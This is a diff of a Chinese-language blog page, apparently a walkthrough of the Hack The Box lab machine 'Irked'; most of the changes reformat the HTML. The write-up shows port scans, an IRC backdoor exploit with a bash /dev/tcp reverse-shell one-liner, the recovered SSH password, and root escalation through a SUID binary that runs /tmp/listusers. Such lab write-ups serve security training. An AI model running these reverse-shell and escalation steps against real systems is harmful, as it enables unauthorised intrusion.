@@ -519,36 +519,65 @@
                 <!-- Post Content -->
                 <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
     
-        <h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>服务器的网页上有一张图片和一行文字。文字表示这个服务器上运行着IRC服务。</p>
+        <h2 id="信息收集"><a class="header-anchor" href="#信息收集"></a>信息收集</h2>
+<p>服务器的网页上有一张图片和一行文字。文字表示这个服务器上运行着IRC服务。</p>
 <p>用Nmap扫描一下。</p>
-<pre><code class="bash">nmap 10.10.10.117 -sS -oN portScan -A</code></pre>
+<pre><code class="language-bash">nmap 10.10.10.117 -sS -oN portScan -A
+</code></pre>
 <p>扫描报告并没有出现之前提到的IRC服务。再次对服务器进行一次更加全面的端口扫描。</p>
-<pre><code class="bash">nmap 10.10.10.117 -p- -sC -sV -oN fullScan</code></pre>
-<p>这次发现了两个运行着IRC服务的端口。8057和6697。<br>尝试去连接IRC服务。查阅一下IRC的<a href="https://tools.ietf.org/html/rfc1459#page-14" target="_blank" rel="noopener external nofollow noreferrer">通讯协议</a>,需要发送PASS，NICK，USER的信息。</p>
+<pre><code class="language-bash">nmap 10.10.10.117 -p- -sC -sV -oN fullScan
+</code></pre>
+<p>这次发现了两个运行着IRC服务的端口。8057和6697。<br>
+尝试去连接IRC服务。查阅一下IRC的<a href="https://tools.ietf.org/html/rfc1459#page-14" target="_blank" rel="noopener external nofollow noreferrer">通讯协议</a>,需要发送PASS，NICK，USER的信息。</p>
 <p>先使用ncat连接上服务器，再按照协议中的规范将指定信息发送给服务器。这样就可以连接上IRC服务器，并且服务器会返回IRC的版本和型号。</p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>搜索一下版本和型号，会找到现成的<a href="https://lwn.net/Articles/392201/" target="_blank" rel="noopener external nofollow noreferrer">漏洞</a>。</p>
-<h3 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h3><p>可以直接使用Metasploit进行漏洞利用。如果是docker的话，需要设置一下LHOST。因为exploit默认的LHOST是错误的，所以第一次反向shell会失败。只有在第一次失败后，才可以更改LHOST。</p>
-<h3 id="手动利用漏洞"><a href="#手动利用漏洞" class="headerlink" title="手动利用漏洞"></a>手动利用漏洞</h3><p>这个漏洞的利用非常的简单。将<code>AB</code>传给IRC，IRC便会将之后的字符当作命令执行。<br>构建一个反向shell的payload。</p>
+<h2 id="漏洞利用"><a class="header-anchor" href="#漏洞利用"></a>漏洞利用</h2>
+<p>搜索一下版本和型号，会找到现成的<a href="https://lwn.net/Articles/392201/" target="_blank" rel="noopener external nofollow noreferrer">漏洞</a>。</p>
+<h3 id="Metasploit"><a class="header-anchor" href="#Metasploit"></a>Metasploit</h3>
+<p>可以直接使用Metasploit进行漏洞利用。如果是docker的话，需要设置一下LHOST。因为exploit默认的LHOST是错误的，所以第一次反向shell会失败。只有在第一次失败后，才可以更改LHOST。</p>
+<h3 id="手动利用漏洞"><a class="header-anchor" href="#手动利用漏洞"></a>手动利用漏洞</h3>
+<p>这个漏洞的利用非常的简单。将<code>AB</code>传给IRC，IRC便会将之后的字符当作命令执行。<br>
+构建一个反向shell的payload。</p>
 <p>监听本地端口</p>
-<pre><code class="bash">ncat -lvnp yourport</code></pre>
+<pre><code class="language-bash">ncat -lvnp yourport
+</code></pre>
 <p>发送shell</p>
-<pre><code class="bash">echo &quot;AB;bash -c&#39;bash -i &amp;&gt; /dev/tcp/yourip/yourport 0&amp;&gt;1&#39;&quot;| ncat 10.10.10.117 8067</code></pre>
-<p>在payload外面套用一次bash的原因是 <code>/dev/tcp/yourip/yourport</code>是bash的特性，在其他的终端中无法使用。<br>具体参数的含义可以在这里<a href="https://blog.csdn.net/ithomer/article/details/9288353" target="_blank" rel="noopener external nofollow noreferrer">查看</a>。</p>
-<h3 id="升级shell"><a href="#升级shell" class="headerlink" title="升级shell"></a>升级shell</h3><p>现在的反向shell非常的简陋，可以给他升一下级。</p>
-<pre><code class="bash">python -c &quot;import pyt;pyt.spawn(&#39;/bin/bash&#39;)&quot;</code></pre>
-<p>这会在一个新的进程中创建一个bash。<br>接下来的升级步骤跟stty有关，由于docker无法使用<code>control+z</code>的快捷键，接下来的升级步骤我便没有继续下去。<br>参考：<br><a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#method3upgradingfromnetcatwithmagic" target="_blank" rel="noopener external nofollow noreferrer">https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#method3upgradingfromnetcatwithmagic</a></p>
-<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>在<code>/home/djmardov/Documents/</code>下可以找到user.txt文件，虽然没有没有权限读取他，但在相同的目录下，有一份隐藏的备份文件。在隐藏文件<code>.backup</code>里面有这样的提示：</p>
+<pre><code class="language-bash">echo &quot;AB;bash -c'bash -i &amp;&gt; /dev/tcp/yourip/yourport 0&amp;&gt;1'&quot;| ncat 10.10.10.117 8067
+</code></pre>
+<p>在payload外面套用一次bash的原因是 <code>/dev/tcp/yourip/yourport</code>是bash的特性，在其他的终端中无法使用。<br>
+具体参数的含义可以在这里<a href="https://blog.csdn.net/ithomer/article/details/9288353" target="_blank" rel="noopener external nofollow noreferrer">查看</a>。</p>
+<h3 id="升级shell"><a class="header-anchor" href="#升级shell"></a>升级shell</h3>
+<p>现在的反向shell非常的简陋，可以给他升一下级。</p>
+<pre><code class="language-bash">python -c &quot;import pyt;pyt.spawn('/bin/bash')&quot;
+</code></pre>
+<p>这会在一个新的进程中创建一个bash。<br>
+接下来的升级步骤跟stty有关，由于docker无法使用<code>control+z</code>的快捷键，接下来的升级步骤我便没有继续下去。<br>
+参考：<br>
+<a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#method3upgradingfromnetcatwithmagic" target="_blank" rel="noopener external nofollow noreferrer">https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#method3upgradingfromnetcatwithmagic</a></p>
+<h3 id="提权"><a class="header-anchor" href="#提权"></a>提权</h3>
+<p>在<code>/home/djmardov/Documents/</code>下可以找到user.txt文件，虽然没有没有权限读取他，但在相同的目录下，有一份隐藏的备份文件。在隐藏文件<code>.backup</code>里面有这样的提示：</p>
 <pre><code>Super elite steg backup pw
-UPupDOWNdownLRlrBAbaSSss</code></pre><p>里面提到了steg，隐写术。网站上是不是有一个图片？user.txt里面是不是有像密码一样的东西？</p>
-<pre><code>steghide extract -sf irked.jpg -p UPupDOWNdownLRlrBAbaSSss</code></pre><p>这样就获得了密码：Kab6h+m+bbp2J:HG。</p>
+UPupDOWNdownLRlrBAbaSSss
+</code></pre>
+<p>里面提到了steg，隐写术。网站上是不是有一个图片？user.txt里面是不是有像密码一样的东西？</p>
+<pre><code>steghide extract -sf irked.jpg -p UPupDOWNdownLRlrBAbaSSss
+</code></pre>
+<p>这样就获得了密码：Kab6h+m+bbp2J:HG。</p>
 <p>接下来可以直接用ssh登录，不再用哪个简陋的shell。</p>
 <pre><code>ssh djmardov@10.10.10.117
-Kab6h+m+bbp2J:HG</code></pre><p>之前的文件里有pw的提示，所以提权的方式是利用一个权限设置不恰当的文件。文件的owner为root，但是用户执行时以root权限运行。</p>
-<pre><code>find / -​type​ f -perm -4000 2&gt;/dev/null </code></pre><p>perm 4000的意思时寻找权限为setuid的文件，即用户可以以root权限执行的文件。<br><code>2&gt;/dev/null</code>会把所有报错信息（Permission Denied）过滤掉。</p>
-<p>参考：<br><a href="https://www.tutonics.com/2012/12/find-files-based-on-their-permissions.html" target="_blank" rel="noopener external nofollow noreferrer">https://www.tutonics.com/2012/12/find-files-based-on-their-permissions.html</a><br><a href="https://developer.ibm.com/tutorials/l-lpic1-104-5/" target="_blank" rel="noopener external nofollow noreferrer">https://developer.ibm.com/tutorials/l-lpic1-104-5/</a></p>
+Kab6h+m+bbp2J:HG
+</code></pre>
+<p>之前的文件里有pw的提示，所以提权的方式是利用一个权限设置不恰当的文件。文件的owner为root，但是用户执行时以root权限运行。</p>
+<pre><code>find / -​type​ f -perm -4000 2&gt;/dev/null 
+</code></pre>
+<p>perm 4000的意思时寻找权限为setuid的文件，即用户可以以root权限执行的文件。<br>
+<code>2&gt;/dev/null</code>会把所有报错信息（Permission Denied）过滤掉。</p>
+<p>参考：<br>
+<a href="https://www.tutonics.com/2012/12/find-files-based-on-their-permissions.html" target="_blank" rel="noopener external nofollow noreferrer">https://www.tutonics.com/2012/12/find-files-based-on-their-permissions.html</a><br>
+<a href="https://developer.ibm.com/tutorials/l-lpic1-104-5/" target="_blank" rel="noopener external nofollow noreferrer">https://developer.ibm.com/tutorials/l-lpic1-104-5/</a></p>
 <p>除去linux自带的文件，有一个奇特的文件viewuser。可以用ltrace和strace进行逆向分析一下，发现它会以root权限去执行<code>/tmp/listusers</code>中的命令。</p>
 <p>创建<code>/tem/listusers</code>，并且写入<code>/bin/bash</code>,给文件加上执行权限。再次执行viewuser，我们便有了root权限。</p>
-<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>Irked并不算难。需要枚举找到正确的漏洞，漏洞的利用都可以自动化完成。提权的操作也比较常规，只要会枚举，完成实验难度不大。</p>
+<h3 id="总结"><a class="header-anchor" href="#总结"></a>总结</h3>
+<p>Irked并不算难。需要枚举找到正确的漏洞，漏洞的利用都可以自动化完成。提权的操作也比较常规，只要会枚举，完成实验难度不大。</p>
         
                 <blockquote style="margin: 2em 0 0;padding: 0.5em 1em;border-left: 3px solid #F44336;background-color: #F5F5F5;list-style: none;">
                     <p><strong>
@@ -1062,11 +1091,11 @@ console.log('\n %c © Material Theme | Version: 1.5.6 | https://github.com/viose
 
                 </main>
             </div><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
-<script async type="text/x-mathjax-config">
+<script type="text/x-mathjax-config">
   MathJax.Hub.Config("");
 </script>
 
-<script async type="text/x-mathjax-config">
+<script type="text/x-mathjax-config">
   MathJax.Hub.Queue(function() {
     var all = MathJax.Hub.getAllJax(), i;
     for(i=0; i < all.length; i += 1) {
@@ -1075,7 +1104,7 @@ console.log('\n %c © Material Theme | Version: 1.5.6 | https://github.com/viose
   });
 </script>
 
-<script async type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML">
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML">
 </script>
 <!-- End: Injected MathJax -->
 <!-- hexo-inject:end -->
